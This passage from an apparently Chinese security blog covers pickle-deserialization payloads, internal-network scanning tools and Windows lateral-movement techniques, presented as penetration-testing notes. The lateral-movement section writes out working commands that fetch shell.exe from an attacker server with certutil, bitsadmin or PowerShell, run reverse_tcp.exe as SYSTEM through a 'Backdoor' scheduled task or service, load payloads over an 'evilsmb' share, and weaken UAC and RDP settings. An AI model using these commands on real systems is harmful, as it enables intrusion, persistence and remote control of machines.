plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">before:flag&#123;fake&#125;<br>output: &lt;__main__.test object at 0x000001F6F7395648&gt;<br>after:flag&#123;true&#125;<br></code></pre></td></tr></table></figure><p><strong>函数执行</strong></p><p>与函数执行相关的opcode有三个： <code>R</code> 、 <code>i</code> 、 <code>o</code> ，所以我们可以从三个方向进行构造：</p><ul><li><p>R：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">import pickle<br>opcode=b&#x27;&#x27;&#x27;cos<br>system<br>(S&#x27;whoami&#x27;<br>tR.&#x27;&#x27;&#x27;<br>pickle.loads(opcode)<br></code></pre></td></tr></table></figure></li><li><p>i：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br>pickle.loads(opcode)<br></code></pre></td></tr></table></figure></li><li><p>o：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&#x27;whoami&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br>pickle.loads(opcode)<br></code></pre></td></tr></table></figure></li></ul><p><strong>实例化对象</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name = name<br>        self.age = age<br><br>data=<span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">Student</span><br><span class="hljs-string">(S&#x27;XiaoMing&#x27;</span><br><span class="hljs-string">S&quot;20&quot;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><br>a=pickle.loads(data)<br><span class="hljs-built_in">print</span>(a.name,a.age)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网信息搜集常用工具</title>
      <link href="/2024/04/11/%E5%86%85%E7%BD%91%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/04/11/%E5%86%85%E7%BD%91%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1><span id="nmap">Nmap</span></h1><p>参考文章：<a href="https://cloud.tencent.com/developer/article/1933509">https://cloud.tencent.com/developer/article/1933509</a></p><p>参考手册：<a href="https://wizardforcel.gitbooks.io/nmap-man-page/content/index.html">https://wizardforcel.gitbooks.io/nmap-man-page/content/index.html</a></p><p>Nmap用于列举网络主机清单、管理服务升级调度、监控主机或服务运行状况。Nmap可以检测目标机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。</p><p>Nmap包含四项基本功能：</p><ul><li>主机发现 (Host Discovery)</li><li>端口扫描 (Port Scanning)</li><li>版本侦测 (Version Detection)</li><li>操作系统侦测 (Operating System Detection)</li></ul><p>copy一下一些nmap的参数过来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">nmap –iflist : 查看本地主机的接口信息和路由信息<br>-A ：选项用于使用进攻性方式扫描<br>-T4： 指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4<br>-oX test.xml： 将扫描结果生成 test.xml 文件，如果中断，则结果打不开<br>-oA test.xml:  将扫描结果生成 test.xml 文件，中断后，结果也可保存<br>-oG test.txt:  将扫描结果生成 test.txt 文件<br>-sn : 只进行主机发现，不进行端口扫描<br>-O : 指定Nmap进行系统版本扫描<br>-sV: 指定让Nmap进行服务版本扫描<br>-p &lt;port ranges&gt;: 扫描指定的端口<br>-sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描<br>-sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况<br>-script &lt;script name&gt; : 指定扫描脚本<br>-Pn ： 不进行ping扫描<br>-sP :  用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping<br>-PI :  设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。<br>-iL 1.txt : 批量扫描1.txt中的目标地址<br> <br>-sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现<br>-sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况<br>-sO: 使用IP protocol 扫描确定目标机支持的协议类型<br>-PO : 使用IP协议包探测对方主机是否开启 <br>-PE/PP/PM : 使用ICMP echo、 ICMP timestamp、ICMP netmask 请求包发现主机<br>-PS/PA/PU/PY : 使用TCP SYN/TCP ACK或SCTP INIT/ECHO方式进行发现<br>-sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态<br>-e eth0：指定使用eth0网卡进行探测<br>-f : --mtu &lt;val&gt;: 指定使用分片、指定数据包的 MTU.<br>-b &lt;FTP relay host&gt;: 使用FTP bounce scan扫描方式<br>-g： 指定发送的端口号<br>-r: 不进行端口随机打乱的操作（如无该参数，nmap会将要扫描的端口以随机顺序方式扫描，以让nmap的扫描不易被对方防火墙检测到）<br>-v 表示显示冗余信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态<br>-n : 表示不进行DNS解析；<br>-D  &lt;decoy1,decoy2[,ME],...&gt;: 用一组 IP 地址掩盖真实地址，其中 ME 填入自己的 IP 地址<br>-R ：表示总是进行DNS解析。 <br>-F : 快速模式，仅扫描TOP 100的端口 <br>-S &lt;IP_Address&gt;: 伪装成其他 IP 地址<br>--ttl &lt;val&gt;: 设置 time-to-live 时间<br>--badsum: 使用错误的 checksum 来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，说明回复来自防火墙或 IDS/IPS）<br>--dns-servers  : 指定DNS服务器<br>--system-dns : 指定使用系统的DNS服务器   <br>--traceroute : 追踪每个路由节点 <br>--scanflags &lt;flags&gt;: 定制TCP包的flags<br>--top-ports &lt;number&gt; :扫描开放概率最高的number个端口<br>--port-ratio &lt;ratio&gt;: 扫描指定频率以上的端口。与上述--top-ports类似，这里以概率作为参数<br>--version-trace: 显示出详细的版本侦测过程信息<br>--osscan-limit: 限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）<br>--osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统<br>--data-length &lt;num&gt;: 填充随机数据让数据包长度达到 Num<br>--ip-options &lt;options&gt;: 使用指定的 IP 选项来发送数据包<br>--spoof-mac &lt;mac address/prefix/vendor name&gt; : 伪装 MAC 地址<br>--version-intensity &lt;level&gt;: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。<br>--version-light: 指定使用轻量侦测方式 (intensity 2)<br>--version-all: 尝试使用所有的probes进行侦测 (intensity 9)<br>--version-trace: 显示出详细的版本侦测过程信息<br>nmap 192.168.1.0/24 -exclude 192.168.1.10  #扫描除192.168.1.0外的该网段的其他地址<br>nmap 192.168.1.0/24 -excludefile f:/1.txt  #扫描除给定文件中的地址以外的其他地址<br>nmap -sF -T4 192.168.1.0 #探测防火墙状态<br></code></pre></td></tr></table></figure><p>更详细的就去看手册学习了，这里就不记录了。</p><h1><span id="arp-scan">Arp-scan</span></h1><p>参考文章：<a href="https://www.royhills.co.uk/wiki/index.php/Arp-scan_option_summary%EF%BC%8Chttps://blog.csdn.net/liver100day/article/details/117560828">https://www.royhills.co.uk/wiki/index.php/Arp-scan_option_summary，https://blog.csdn.net/liver100day/article/details/117560828</a></p><p>arp-scan是Kali Linux自带的一款ARP扫描工具。该工具可以进行单一目标扫描，也可以进行批量扫描。批量扫描的时候，用户可以通过CIDR<br>地址范围或者列表文件的方式指定。该工具允许用户定制ARP包，构建非标准数据包。同时，该工具会自动解析Mac地址，给出MAC对应的硬<br>件厂商，帮助用户确认目标。</p><p>这里copy一下常用指令：</p><table><thead><tr><th>参数名</th><th>参数含义</th><th>使用示例</th></tr></thead><tbody><tr><td>-f</td><td>从指定文件中读取主机名或地址</td><td>arp-scan -f ip.txt</td></tr><tr><td>-l</td><td>从网络接口配置生成地址</td><td>arp-scan -l</td></tr><tr><td>-i</td><td>各扫描之间的时间差</td><td>arp-scan -l -i 1000</td></tr><tr><td>-r</td><td>每个主机扫描次数</td><td>arp-scan -l -r 5</td></tr><tr><td>-V</td><td>显示程序版本并退出</td><td>arp-scan -l -V</td></tr><tr><td>-t</td><td>设置主机超时时间</td><td>arp-scan -t 1000 192.168.75.0&#x2F;24</td></tr><tr><td>-L</td><td>使用网络接口</td><td>arp-scan -L eth0</td></tr><tr><td>-g</td><td>不显示重复的数据</td><td>arp-scan -l -g</td></tr><tr><td>-D</td><td>显示数据包往返时间</td><td>arp-scan -l -D</td></tr></tbody></table><h1><span id="fscan">fscan</span></h1><p>参考文章：<a href="https://cloud.tencent.com/developer/article/1821061">https://cloud.tencent.com/developer/article/1821061</a></p><p>项目地址：<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><p>fscan 是一个内网综合扫描工具，方便一键自动化、全方位漏洞扫描工具。</p><p>它支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。</p><p><strong>kali安装</strong></p><p>要在1.8.2的版本才有Linux的</p><p><img src="http://cdn.clown2024.cn/202407151445874.png" alt="image-20240419191321892"></p><p>下载之后直接”.&#x2F;fscan_amd64”即可</p><p><strong>简单用法</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">fscan.exe -h 192.168.1.1/24  (默认使用全部模块)<br>fscan.exe -h 192.168.1.1/16  (B段扫描)<br></code></pre></td></tr></table></figure><p>下面扫描试了一下</p><p><img src="http://cdn.clown2024.cn/202407151445875.png" alt="image-20240419191600603"></p><p>他还会自动去测试开放端口的服务以及尝试一些payload，不过全部扫面就会比较耗时，可以配合一些参数适当跳过，这里贴一下全部参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-c string<br>      ssh命令执行<br>-cookie string<br>      设置cookie<br>-debug int<br>      多久没响应,就打印当前进度(default 60)<br>-domain string<br>      smb爆破模块时,设置域名<br>-h string<br>      目标ip: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12<br>-hf string<br>      读取文件中的目标<br>-hn string<br>      扫描时,要跳过的ip: -hn 192.168.1.1/24<br>-m string<br>      设置扫描模式: -m ssh (default &quot;all&quot;)<br>-no<br>      扫描结果不保存到文件中<br>-nobr<br>      跳过sql、ftp、ssh等的密码爆破<br>-nopoc<br>      跳过web poc扫描<br>-np<br>      跳过存活探测<br>-num int<br>      web poc 发包速率  (default 20)<br>-o string<br>      扫描结果保存到哪 (default &quot;result.txt&quot;)<br>-p string<br>      设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default &quot;21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017&quot;)<br>-pa string<br>      新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)<br>-path string<br>      fcgi、smb romote file path<br>-ping<br>      使用ping代替icmp进行存活探测<br>-pn string<br>      扫描时要跳过的端口,as: -pn 445<br>-pocname string<br>      指定web poc的模糊名字, -pocname weblogic<br>-proxy string<br>      设置代理, -proxy http://127.0.0.1:8080<br>-user string<br>      指定爆破时的用户名<br>-userf string<br>      指定爆破时的用户名文件<br>-pwd string<br>      指定爆破时的密码<br>-pwdf string<br>      指定爆破时的密码文件<br>-rf string<br>      指定redis写公钥用模块的文件 (as: -rf id_rsa.pub)<br>-rs string<br>      redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)<br>-silent<br>      静默扫描,适合cs扫描时不回显<br>-sshkey string<br>      ssh连接时,指定ssh私钥<br>-t int<br>      扫描线程 (default 600)<br>-time int<br>      端口扫描超时时间 (default 3)<br>-u string<br>      指定Url扫描<br>-uf string<br>      指定Url文件扫描<br>-wt int<br>      web访问超时时间 (default 5)<br>-pocpath string<br>      指定poc路径<br>-usera string<br>      在原有用户字典基础上,新增新用户<br>-pwda string<br>      在原有密码字典基础上,增加新密码<br>-socks5<br>      指定socks5代理 (as: -socks5  socks5://127.0.0.1:1080)<br>-sc <br>      指定ms17010利用模块shellcode,内置添加用户等功能 (as: -sc add)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透体系建设-内网横向移动</title>
      <link href="/2024/04/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
      <url>/2024/04/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h1><span id="横向移动中的文件传输">横向移动中的文件传输</span></h1><p>制定文件传输的方案，以便在后续操作过程向攻击目标部署攻击载荷或其他文件。</p><h2><span id="通过网络共享">通过网络共享</span></h2><p>Windows 系统中的网络共享功能可以实现局域网之间的文件共享。通过提供有效的用户凭据，用户可以很轻松地将文件从一台机器传输到另一台机器。</p><p>执行<strong>net share</strong>命令可以查看Windows系统默认开启的网络共享</p><p><img src="http://cdn.clown2024.cn/202407151448981.png" alt="image-20240411004232276"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">C$：C盘共享<br>D$：D盘共享<br>...依次类推<br><br>ADMIN$：系统目录共享<br><br>IPC$(Internet Process Connection)：是共享“命名管道”的资源，为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。<br></code></pre></td></tr></table></figure><p>而实战中往往会建立IPC$连接。因为通过IPC$连接，不仅可以进行所有文件共享操作，还可以实现其他远程管理操作，如列出远程主机进程、在远程主机上创建计划任务或系统服务等。</p><p>建立IPC$连接要满足两个条件：</p><ol><li>远程主机开启了IPC连接</li><li>远程主机的139端口和445端口开放</li></ol><p>执行下列命令与远程主机建立IPC连接：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">net use \\&lt;IP/Hostname&gt;\IPC$ &lt;Password&gt; /user:&lt;Username&gt;<br></code></pre></td></tr></table></figure><p>此时执行下列命令可以列出C盘共享目录：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">dir \\&lt;IP&gt;\C$<br></code></pre></td></tr></table></figure><p>使用<strong>copy</strong>命令可以通过共享连接向远程主机上复制文件，也可以将远程主机上的文件复制到本地，但需要注意当前用户对远程目录的权限。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">copy .\reverse_tcp.exe \\&lt;ip&gt;\C$<br></code></pre></td></tr></table></figure><p>建立其他共享连接也类似，例如C$：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net use \\&lt;IP/Hostname&gt;\C$ &lt;Password&gt; /user:&lt;Username&gt;<br></code></pre></td></tr></table></figure><h2><span id="搭建smb服务器">搭建SMB服务器</span></h2><p>SMB(Server Message Block，服务器消息块)，又称 CIFS(Common Internet FileSystem，网络文件共享系统)，由微软开发，基于应用层网络传输协议，主要功能是使网络上的计算机能够共享计算机文件、打印机、串行端口和通新等资源。SMB 消息一般使用 NetBIOS 协议或 TCP 发送，分别使用端口 139 或 445，目前倾向于使用 445 端口。</p><p>实战中可以在测试人员自己的服务器或当前所控内网主机上搭建 SMB 服务器,将需要横向传输的文件如攻击载荷等放入 SMB 服务器的共享目录，并指定UNC路径，让横向移动的目标主机远程加载 SMB 共享的文件。注意，需使用 SMB 匿名共享，并且搭建的SMB服务器能够被横向移动的目标所访问到。</p><p>在Linux上可以使用Impacket项目的smbserver.py来搭建SMB服务器</p><p>执行下面命令搭建一个名为evilsmb，共享目录指向&#x2F;root&#x2F;share的SMB匿名共享</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mkdir /root/share<br>python smbserver.py evilsmb /root/share -smb2support<br></code></pre></td></tr></table></figure><p>在Windows上如果获得管理员权限可以手动配置SMB匿名共享，也可以通过Invoke-BuildAnonymousSMBServer快速搭建，项目地址：<a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer">https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer</a></p><h2><span id="通过windows自带工具">通过Windows自带工具</span></h2><p><strong>Certutil</strong></p><p>Certutil 是 Windows 自带的命令行工具，用于管理 Windows 证书并作为证书服务的一部分安装。Certutil提供了从网络中下载文件的功能，测试人员可以在远程主机上执行Certutil命令，控制其下载预先部署在可控服务器上的恶意文件，如攻击载荷等。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">certutil -urlcache -split -f http://IP:Port/shell.exe C:\reverse_tcp.exe<br></code></pre></td></tr></table></figure><p>通过certutil下载shell.php，并保存为reverse_tcp.exe</p><p><strong>BITSAdmin</strong></p><p>这是Windows7之后自带的命令行工具，可以用于文件上传下载、监控上传进度</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">bitsadmin /transfer test http://ip:port//shell.exe C:\reverse_tcp.exe<br><span class="hljs-meta prompt_">#</span><span class="language-bash">创建一个名为<span class="hljs-built_in">test</span>的下载任务，将shell.exe下载到本地</span><br></code></pre></td></tr></table></figure><p><strong>PowerShell</strong></p><p>可以通过创建WebClient对象来实现文件下载</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">(New-Object Net.WebClient).DownloadFile(&quot;http://ip:port/shell.exe&quot;,&quot;C:\reverse_tcp.exe&quot;)<br></code></pre></td></tr></table></figure><h1><span id="创建计划任务">创建计划任务</span></h1><h2><span id="常规利用流程">常规利用流程</span></h2><p>创建IPC连接之后，可以在远程主机创建计划任务；在拥有对方管理员凭据的情况下可以实现横向移动</p><p>具体操作流程如下：</p><ol><li><p>利用已建立的共享连接向主机上传攻击载荷</p></li><li><p>利用已建立的IPC连接或指定用户凭据的方式在远程主机创建计划任务</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR reverse_tcp.exe /RU System /F<br><span class="hljs-meta prompt_"># </span><span class="language-bash">/S,指定要连接的系统；/TN，指要创建的计划任务的名称；/SC，指计划任务执行的频率</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">/MO，计划任务执行的周期；/TR，执行的程序路径；/RU，计划任务执行的系统权限；</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">/F，若任务已存在则强制创建</span><br></code></pre></td></tr></table></figure><p>如果没用建立IPC连接，需要手动指定用户凭据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR reverse_tcp.exe /RU System /F /U Administrator /P Admin@123<br></code></pre></td></tr></table></figure></li><li><p>执行下面命令启动计划任务,也可以等待计划任务自己启动</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /RUN /S 10.10.10.19 /I /TN Backdoor<br></code></pre></td></tr></table></figure></li><li><p>执行下面命令删除计划任务</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Delete /S 10.10.10.19 /TN Backdoor /F<br></code></pre></td></tr></table></figure></li></ol><p>还可以通过写计划任务执行系统命令，并将结果写入文件保存</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR &quot;C:\Windows\System32\cmd.exe /c &#x27;whoami &gt; C:\result.txt&#x27;&quot; /RU System /F<br></code></pre></td></tr></table></figure><h2><span id="unc路径加载执行">UNC路径加载执行</span></h2><p>Windows中使用UNC路径来访问共享资源，格式如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">\\servername\sharename\directory\filename<br></code></pre></td></tr></table></figure><blockquote><p>servername为主机名，sharename为网络共享名称，directory和filename为共享下的目录和名称</p></blockquote><p>通过该方法可以省去上传攻击载荷的步骤，直接用UNC路径代替本地路径，让远程主机直接加载测试人员搭建的SMB匿名服务器上的共享目录下的攻击载荷</p><p>这里以创建计划任务示例，创建其他任务来加载文件的形式一样</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR \\192.168.2.143\evilsmb\reverse_tcp.exe /RU System /F /U Administrator /P Admin@123<br></code></pre></td></tr></table></figure><h1><span id="利用系统服务">利用系统服务</span></h1><h2><span id="创建远程服务">创建远程服务</span></h2><p>除了创建计划任务，测试人员还可以通过在远程主机上创建系统服务的方式，在远程主机上运行指定的程序或命令。该方式需要拥有两端主机的管理员权限和IPC$连接，具体操作如下：</p><ol><li><p>利用已建立的共享连接上传攻击载荷</p></li><li><p>利用已建立的IPC连接创建系统任务</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc \\10.10.10.19 create Backdoor binpath= &quot;cmd.exe /k C:\reverse_tcp.exe&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">binpath，指定服务启动时运行的二进制文件，<span class="hljs-string">&quot;=&quot;</span>后面有一个空格</span><br></code></pre></td></tr></table></figure></li><li><p>启动该服务</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc \\10.10.10.19 start Backdoor<br></code></pre></td></tr></table></figure></li><li><p>攻击成功后，删除创建的任务</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc \\10.10.10.19 delete Backdoor<br></code></pre></td></tr></table></figure></li></ol><h2><span id="scshell">SCShell</span></h2><p>SCShell是一款利用系统服务的无文件横向移动工具。</p><p>跟传统创建系统任务不同的是，SCShell 利用提供的用户凭据，通过ChangeServiceConfigA API修改远程主机上的服务配置，将服务的二进制路径名修改为指定的程序或攻击载荷，然后重启服务。执行结束后，服务二进制路径将恢复为原始路径</p><p>SCShell 需要提供远程主机的管理员权限用户的凭据，并且需要已知远程主机上的系统服务名称。方法如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">SCShell.exe 10.10.10.19 XblAuthManager &quot;C:\Windows\System32\cmd.exe /c calc&quot; hacke-my.com Administrator Admin@123<br><span class="hljs-meta prompt_"># </span><span class="language-bash">SCShell.exe &lt;target&gt; &lt;Service Name&gt; &lt;Payload&gt; &lt;Username&gt; &lt;Password&gt;</span><br></code></pre></td></tr></table></figure><h2><span id="uac-remote-restrictions">UAC Remote Restrictions</span></h2><p>为了更好地保护属于本地管理员组成员的用户，微软在 Windows Vista 以后的操作系统中引入了 UACRemote Restrictions(远程限制)。此机制有助于防止本地恶意软件以管理权限远程运行。</p><p>因此，如果测试人员使用计算机本地用户进行需要管理员权限的远程管理操作，无论是schtasks还是PsExec、WMI、WinRM、哈希传递攻击等，都只能使用RID 500的本地管理员用户才行，使用其他任何用户包括非RID 500用户都会提示<strong>拒绝访问</strong>。</p><p>注意，UAC Remote Restrictions只限制本地用户，域管理员用户不受限制，因此会在很大程度上限制工作组环境中的横向移动。</p><p>如果有权限的话可以通过下面命令来重启系统关闭UAC Remote Restrictions：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f<br></code></pre></td></tr></table></figure><h1><span id="远程桌面利用">远程桌面利用</span></h1><p>远程桌面协议(Remote Desktop Protocol，RDP)是微软从 Windows Server 2000 开始提供的功能，用户可以通过该功能登录并管理远程主机，所有操作就像在自己的计算机上操作一样。远程桌面协议默认监听 TCP 3389 端口。</p><p>可以利用远程桌面服务对目标主机进行实时操作，但是这种方法可能将已登录的用户强制退出，容易被管理员发现。</p><h2><span id="远程桌面的确定和开启">远程桌面的确定和开启</span></h2><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections<br></code></pre></td></tr></table></figure><p>上面命令通过查询注册表来确定当前主机是否开启了远程桌面功能，若字段为0，则说明RDP服务已经启动，若为1，则说明禁用。</p><p><img src="http://cdn.clown2024.cn/202407151448982.png" alt="image-20240415001846792"></p><p>执行下面命令可以开启远程桌面功能：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">开启远程桌面连接</span><br>reg add &quot;HKLM\SYSTEM\CurrentControlset\control\Terminal Server&quot; /v fDenyTSconnections /t REG_DWORD /d 0 /f<br><span class="hljs-meta prompt_"># </span><span class="language-bash">关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”(鉴权)</span><br>reg add &quot;HKLM\SYSTEM\CurrentControlset\control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f<br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置防火墙策略放行3389端口</span><br>netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow<br></code></pre></td></tr></table></figure><p>对于远程主机，可以通过WMI来开启远程桌面功能,不过需要指定远程主机的IP、主机名和用户凭据：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic /Node:10.10.10.19 /User:Administrator /Password:Admin@123 RDTOGGLE WHERE ServerName=&#x27;WIN2016-WEB3&#x27; call SetAllowTSConnections 1<br></code></pre></td></tr></table></figure><h2><span id="rdp-hijacking">RDP Hijacking</span></h2><h2><span id="sharprdp">SharpRDP</span></h2><p>SharpRDP 是一款开源工具，可以通过远程桌面协议在远程主机上执行系统命令，且不需 GUI 客户端。该工具需要远程主机开启远程桌面功能，并且防火墙放行 3389 端口。</p><p>通常在内网渗透时，如果想登录一台内网主机的远程桌面，需要先搭建内网代理然后使用 RDP 客户端进行连接。但是，测试人员可以直接将 SharpRDP 上传到跳板机，然后用获取到的用户凭据，对内网其他主机执行系统命令。这样就省去了内网代理等中间环节。</p><h1><span id="psexec-远程控制">PsExec 远程控制</span></h1><p>PsExec 是微软官方提供的一款实用的 Windows 远程控制工具，可以根据凭据在远程系统上执行管理操作，并且可以获得与命令行几乎相同的实时交互性。PsExec最强大的功能之一就是可以在远程系统中启动交互式命令提示窗口，以便实时显示有关远程系统的信息。</p><p>PsExec 原理是通过SMB连接到服务端的Admin$共享，并释放名为“psexesvc.exe的二进制文件，然后注册名为“PSEXESVC”服务。当客户端执行命令时，服务端通过PSEXESVC服务启动相应的程序执行命令并回显数据。运行结束后，PSEXESVC服务会被删除。</p><p>使用PsExec进行操作需要两个条件：</p><ol><li>远程主机开启了Admin$共享</li><li>远程主机未开启防火墙或者放行445端口</li></ol><p>满足条件执行下面命令，用域管理员的账户连接远程主机，并以SYSTEM权限启动一个交互式命令行</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">PsExec.exe -accepteula \\10.10.10.19 -u HACK-MY\Administrator -p Admin@123 -s cmd.exe<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-accepteula，禁止弹出许可证对话框;-u，指定远程主机的用户名;-p，指定用户的密码</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-s，以 SYSTEM权限启动进程，如果未指定该参数，就将以管理员权限启动进程</span><br></code></pre></td></tr></table></figure><p>如果已有相应凭据，可以直接使用PsExec连接远程主机</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">PsExec.exe -accepteula \\10.10.10.19 cmd.exe<br></code></pre></td></tr></table></figure><h1><span id="wmi的利用">WMI的利用</span></h1><p>WMI(Windows Management Instrumentation，Windows 管理规范)是一项核心的Windows 管理技术。用户可以通过 WMI 管理本地和远程计算机。Windows 为远程传输WMI数据提供了两个可用的协议,即分布式组件对象模型(Distributed Component Object Model，DCOM)和 Windows远程管理(Windows Remote Management，WinRM)，使得WMI对象的查询、事件注册、WMI类方法的执行和类的创建等操作都能够远程进行。</p><p>在横向移动时，测试人员可以利用WMI提供的管理功能，通过已获取的用户凭据，与本地或远程主机进行交互，并控制其执行各种行为。目前有两种常见的利用方法:<strong>一是通过调用 WMI 的类方法进行远程执行</strong>,如 Win32 Process 类中的 Create 方法可以在远程主机上创建进程,Win32 